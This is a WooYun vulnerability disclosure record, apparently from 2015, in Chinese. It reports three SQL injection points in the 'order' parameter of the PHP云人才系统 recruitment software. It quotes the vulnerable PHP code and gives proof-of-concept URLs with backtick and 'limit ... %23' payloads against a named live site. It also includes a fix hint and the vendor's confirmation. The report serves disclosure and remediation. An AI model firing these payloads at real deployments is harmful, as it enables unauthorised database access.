{"id": 41236, "wybug_id": "wooyun-2015-089489", "wybug_title": "PHP云人才系统(20141229)2处SQL注入", "wybug_corp": "php云人才系统", "wybug_author": "龟兔赛跑", "wybug_date": "2015-01-07 12:50", "wybug_open_date": "2015-04-13 16:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-13：\t细节向公众公开  简要描述： PHP云人才系统(20141229)二处隐蔽的SQL注入 详细说明：  PHP云人才系统二处SQL注入。0x01: 问答首页========================URL为：\nhttp://www.hr135.com/ask/index.php?order=add_time\n其中参数order可以注入。看看代码/include/libs/Smarty_Compiler.class.php：5330\n5330  \tfunction _complie_qlist_start($tag_args)5331      {5332          $paramer = $this->_parse_attrs($tag_args);5333          $item = str_replace(\"'\",\"\",$paramer[item]);5334          global $db,$db_config,$config;5335          $path = dirname(dirname(dirname(__FILE__)));5336          $ParamerArr = $this->GetSmarty($paramer,$_GET);5337          $paramer = $ParamerArr[arr];5338          $Purl =  $ParamerArr[purl];5339  5340          $where=1;5341          //�����ֶ�Ĭ��Ϊ����ʱ��5342          if($paramer[order]){5343              if($paramer[order]==\"addtime\"){5344                  $paramer[order]=\"add_time\";5345              }5346              if($paramer[order]==\"answernum\"){5347                  $paramer[order]=\"answer_num\";5348              }5349              $order = \" ORDER BY `\".$paramer[order].\"`  desc\";5350          }else{5351              $order = \" ORDER BY `add_time` desc\";5352          }5353          if($paramer[cid]){5354              $where .=\" and `cid`='\".$paramer[cid].\"'\";5355          }5356          if($paramer[uid]){5357              $where .=\" and `uid`='\".$_COOKIE[uid].\"'\";5358          }5359          if($paramer[recom]){//�Ƽ� �ֶ�5360              $where .=\" and `is_recom`='1'\";5361          }5362          if($paramer[limit]){5363              $limit=\" limit \".$paramer[limit];5364          }5365          if($paramer[ispage]){5366              $limit = $this->PageNav($paramer,$_GET,\"question\",$where,$Purl,\"\",\"2\");5367              //$limit = $this->PageNav($paramer,$_GET,\"q_class\",$where,$Purl,'','2');5368              //$this->_tpl_vars[\"firmurl\"] = $config['sy_weburl'].\"/index.php?m=question\".$ParamerArr[firmurl];5369          }5370          $rs = $db->select_all(\"question\",$where.$order.$limit);\n里面的5349行将$paramer[order]带入了SQL，由于有``,但是addslashs不会修改`,所以可以注入`闭合原来SQL，然后插入SQL语句。再看看调用的地方，/ask/model/index.class.php：26\n26  \tfunction index_action(){  27          $this->public_action();  28          $this->yunset(\"c\",\"index\");  29          $this->yunset(\"order\",$_GET['order']);  30          $my_attention=$this->obj->DB_select_once(\"attention\",\"`uid`='\".$this->uid.\"' and `type`='1'\",\"ids\");  31          $my_atten=@explode(',',rtrim($my_attention['ids'],\",\"));  32          $this->seo('ask_index');  33          $this->yunset(\"my_atten\",$my_atten);  34          $this->wenda_tpl('index');  35      }\n$this->yunset(\"order\",$_GET['order']);没有过滤order，传递给参数@order。然后在模版里面template/ask/index.htm:15\n15          {yun:}qlist item=qlist ispage=1 t_len=20 order=@order limit=10{/yun}  16          <div class=\"answers_left_list\">  17              <div class=\"answers_left_list_left\">  18                  <div class=\"answers_app_left\" onmouseover=\"get_user_info('question_','{yun:}$qlist.id{/yun}','{yun:}$qlist.uid{/yun}','50');\" onmouseout=\"hide_user_info('question_','{yun:}$qlist.id{/yun}')\"  id='question_{yun:}$qlist.id{/yun}' style=\" cursor:pointer\">  19                      <img src=\"{yun:}$qlist.pic{/yun}\" width=\"40\" height=\"40\" onerror=\"showImgDelay(this,'{yun:}$config.sy_weburl{/yun}/{yun:}$config.sy_friend_icon{/yun}',2);\">  20                  </div>  21              </div>\n在第15行将@order传递给了_complie_qlist_start().\nhttp://www.hr135.com/ask/index.php?order=add_time`\nSQL出错没有任何数据\n\n\nhttp://www.hr135.com/ask/index.php?order=add_time`%20limit%201%23\n取一条数据：\n\n\nhttp://www.hr135.com/ask/index.php?order=add_time`%20limit%202%23\n取两条数据：\n\n0x02: 找工作搜索页========================URL为：\nhttp://www.hr135.com/index.php?m=com&order=id&c=search&keyword=a\norder参数可以注入。\nhttp://www.hr135.com/index.php?m=com&order=id`&c=search&keyword=a\nSQL出错，没有数据\n\n\nhttp://www.hr135.com/index.php?m=com&order=id%20limit%201%23&c=search&keyword=a\n取一条数据：\n\n\nhttp://www.hr135.com/index.php?m=com&order=id%20limit%202%23&c=search&keyword=a\n取两天数据：\n\n0x03: 招人才首页========================URL为：\nhttp://www.hr135.com/index.php?m=user&order=status_time\n其中参数order可以注入。\nhttp://www.hr135.com/index.php?m=user&order=status_time`\nSQL出错，没有数据：\n\n\nhttp://www.hr135.com/index.php?m=user&order=status_time`%20limit%201%23\n取一条数据：\n\n\nhttp://www.hr135.com/index.php?m=user&order=status_time`%20limit%202%23\n取两条数据：\n\n   漏洞证明：  \n\n\nhttp://www.hr135.com/ask/index.php?order=add_time`%20limit%202%23\n取两条数据：\n\n\n\n\nhttp://www.hr135.com/index.php?m=com&order=id%20limit%202%23&c=search&keyword=a\n取两天数据：\n\n\n\n\nhttp://www.hr135.com/index.php?m=user&order=status_time`%20limit%202%23\n取两条数据：\n\n   修复方案：  include/libs/Smarty_Compiler.class.php里面搜索一下ORDER BY,基本上搜出来的地方都需要过滤。   版权声明：转载请注明来源 龟兔赛跑@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-01-11 12:29 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}